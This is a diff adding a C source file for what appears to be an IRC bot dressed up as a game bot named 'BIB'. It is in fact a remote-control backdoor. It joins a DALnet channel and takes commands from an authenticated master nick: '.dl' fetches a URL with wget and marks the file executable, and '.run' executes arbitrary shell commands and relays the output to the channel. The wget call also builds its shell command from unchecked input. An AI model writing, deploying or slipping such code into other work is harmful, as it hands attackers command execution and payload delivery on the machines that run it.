@@ -1,0 +1,309 @@
+#define _GNU_SOURCE
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdbool.h>
+#include <stdarg.h>
+#include <stddef.h>
+#include <string.h>
+#include <ctype.h>
+#include <time.h>
+#include <sys/stat.h>
+
+
+#define DYAD_IMPLEMENTATION
+#include "dyad.h"
+
+#define CONFIG_IMPLEMENTATION
+#include "config.h"
+
+
+#define CONFIG_PATH "config.cfg"
+
+
+#define STRING_MAX 256
+
+
+#define GAME_TITLE "BIB"
+#define PFX "."
+
+static char    *mst = "siesta";
+static int 	prt = 6667;
+static char    *srv = "sakura.jp.as.dal.net";
+static char    *chn = "#pantasya";
+static char    *nck = "siestu";
+static char    *pss = NULL;
+static char    *apss = NULL;
+
+
+bool 		auth = false;
+
+Config        **configs = NULL;
+size_t 		nconfigs = 0;
+
+dyad_Stream    *stm;
+
+
+
+static char    *cmd = NULL, *usr = NULL, *par = NULL, *txt = NULL;
+
+int 		isReg = 0;
+
+
+char           *word = NULL;
+
+
+size_t 		elapsedtime = 0, remainingtime = 0, allottedtime = 180;
+
+
+typedef enum GameState {
+	GAMESTATE_INIT = 0,
+	GAMESTATE_START,
+	GAMESTATE_MAX
+} 		GameState;
+
+GameState 	gamestate = GAMESTATE_INIT;
+
+
+
+
+static void 	sendf(dyad_Stream * s, char *fmt,...);
+
+
+
+static void 	onConnect(dyad_Event * e);
+static void 	onError(dyad_Event * e);
+static void 	onTick(dyad_Event * e);
+static void 	onLine(dyad_Event * e);
+
+
+
+static void
+sendf(dyad_Stream * s, char *fmt,...)
+{
+
+	char           *buf1 = NULL;
+	char           *buf2 = NULL;
+	ssize_t 	buflen = 0;
+
+	va_list 	args;
+
+	va_start(args, fmt);
+	buflen = vsnprintf(NULL, 0, fmt, args);
+	va_end(args);
+
+	buf1 = calloc(buflen + 5, sizeof(*buf1));
+	buf2 = calloc(buflen + 5, sizeof(*buf2));
+
+	va_start(args, fmt);
+	vsprintf(buf1, fmt, args);
+	va_end(args);
+
+	sprintf(buf2, "<-- %s", buf1);
+
+	printf("%s\n", buf2);
+
+	dyad_writef(s, "%s\r\n", buf1);
+
+	free(buf2);
+	buf2 = NULL;
+	free(buf1);
+	buf1 = NULL;
+}
+
+
+
+static void
+onConnect(dyad_Event * e)
+{
+	if (pss) {
+		sendf(e->stream, "PASS %s", pss);
+	}
+	sendf(e->stream, "NICK %s", nck);
+	sendf(e->stream, "USER %s %s %s :%s", nck, nck, nck, nck);
+}
+
+
+
+static void
+onError(dyad_Event * e)
+{
+	printf("error: %s\n", e->msg);
+}
+
+
+
+static void
+onTick(dyad_Event * e)
+{
+
+}
+
+
+
+static void
+onLine(dyad_Event * e)
+{
+
+	char           *tmp = NULL;
+
+	printf("--> %s\n", e->data);
+
+	tmp = strdup(e->data);
+
+	cmd = tmp;
+
+	usr = srv;
+
+	if (cmd == NULL) {
+		return;
+	}
+	if (*cmd == '\0') {
+		free(cmd);
+		return;
+	}
+	if (cmd[0] == ':') {
+		usr = cmd + 1;
+		cmd = skip(usr, ' ');
+		if (cmd[0] == '\0')
+			return;
+		skip(usr, '!');
+	}
+	skip(cmd, '\r');
+	par = skip(cmd, ' ');
+	txt = skip(par, ':');
+
+	trim(par);
+	trim(txt);
+
+
+
+	if (strcmp(cmd, "PING") == 0) {
+		sendf(e->stream, "PONG :%s", txt);
+	} else if (strcmp(cmd, "001") == 0) {
+		printf("Connected.\n");
+		sendf(e->stream, "JOIN %s", chn);
+		isReg = 1;
+	} else if (strcmp(cmd, "PRIVMSG") == 0) {
+
+		char 		url      [STRING_MAX];
+		char 		authpass [STRING_MAX];
+		char 		xcmd     [STRING_MAX];
+
+		printf("<%s> %s\n", usr, txt);
+
+		if (!strcmp(usr, mst)) {
+
+			if (auth) {
+
+				if (sscanf(txt, PFX "dl %[^\n]\n", url) == 1) {
+					char *fn = NULL;
+
+					snprintf(xcmd, STRING_MAX, "wget -c '%s'", url);
+
+					printf("url: %s\n", url);
+
+					system(xcmd);
+
+					fn = strrchr(url, '/');
+					if (fn) {
+						fn++;
+					}
+
+					if (chmod(fn, strtol("0777", 0, 8)) < 0) {
+						sendf(e->stream, "PRIVMSG %s :" GAME_TITLE " Error: cannot chmod", chn);
+					}
+				} else if (sscanf(txt, PFX "run %[^\n]\n", xcmd) == 1) {
+
+					FILE *fp;
+					char line[STRING_MAX];
+
+					printf("cmd: %s\n", xcmd);
+
+					/* Open the command for reading. */
+					fp = popen(xcmd, "r");
+					if (fp == NULL) {
+						sendf(e->stream, "PRIVMSG %s :" GAME_TITLE " failed to run command", chn);
+					} else {
+						/*
+	  					 * Read the output a line at a time -
+	  					 * output it.
+	  					 */
+						while (fgets(line, sizeof(line), fp) != NULL) {
+							char           *p = strchr(line, '\n');
+							if (p) {
+								*p = '\0';
+							}
+							sendf(e->stream, "PRIVMSG %s :" GAME_TITLE " %s", chn, line);
+						}
+
+						/* close */
+						pclose(fp);
+
+					}
+				}
+			} else if (sscanf(txt, PFX "auth %[^\n]\n", authpass) == 1) {
+				if (!strcmp(authpass, apss)) {
+					auth = true;
+					sendf(e->stream, "PRIVMSG %s :" GAME_TITLE " Access Granted", usr);
+				} else {
+					sendf(e->stream, "PRIVMSG %s :" GAME_TITLE " Access Denied", usr);
+				}
+			}
+		}
+	}
+	free(tmp);
+	tmp = NULL;
+}
+
+
+int
+main(void)
+{
+
+	size_t 		i;
+
+	srand((unsigned int) time(NULL));
+
+	if (ReadConfig(CONFIG_PATH, &configs, &nconfigs) != 0) {
+		return 1;
+	}
+	for (i = 0; i < nconfigs; i++) {
+		if (strcasecmp(configs[i]->key, "port") == 0) {
+			prt = atoi(configs[i]->val);
+		} else if (strcasecmp(configs[i]->key, "server") == 0) {
+			srv = configs[i]->val;
+		} else if (strcasecmp(configs[i]->key, "nick") == 0) {
+			nck = configs[i]->val;
+		} else if (strcasecmp(configs[i]->key, "channel") == 0) {
+			chn = configs[i]->val;
+		} else if (strcasecmp(configs[i]->key, "password") == 0) {
+			pss = configs[i]->val;
+		} else if (strcasecmp(configs[i]->key, "authpass") == 0) {
+			apss = configs[i]->val;
+		}
+	}
+
+
+
+	dyad_init();
+
+	stm = dyad_newStream();
+
+	dyad_addListener(stm, DYAD_EVENT_CONNECT, onConnect, NULL);
+	dyad_addListener(stm, DYAD_EVENT_ERROR, onError, NULL);
+	dyad_addListener(stm, DYAD_EVENT_LINE, onLine, NULL);
+	dyad_addListener(stm, DYAD_EVENT_TICK, onTick, NULL);
+
+	printf("Connecting...\n");
+
+	dyad_connect(stm, srv, prt);
+
+	while (dyad_getStreamCount() > 0) {
+		dyad_update();
+	}
+
+	dyad_shutdown();
+
+	return 0;
+}
